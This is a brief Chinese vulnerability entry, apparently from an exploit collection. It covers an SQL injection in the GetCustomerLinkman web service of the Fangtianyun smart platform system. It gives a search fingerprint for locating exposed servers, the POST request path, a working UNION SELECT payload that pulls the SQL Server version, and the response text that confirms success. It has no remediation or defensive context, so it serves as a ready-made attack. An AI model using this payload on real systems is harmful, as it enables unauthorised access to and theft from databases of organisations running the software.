# 方天云智慧平台系统GetCustomerLinkmanSQL注入漏洞

方天云智慧平台系统GetCustomerLinkman ｜ SQL注入 ｜ —
- **指纹**：`body="AjaxMethods.asmx/GetCompanyItem"`
- **请求**：`POST /WXAPI.asmx/GetCustomerLinkman HTTP/1.1`

**Payload**
```
{clmID:"1 UNION ALL SELECT NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QurA"}
```
- **响应特征**：200 Microsoft SQL Server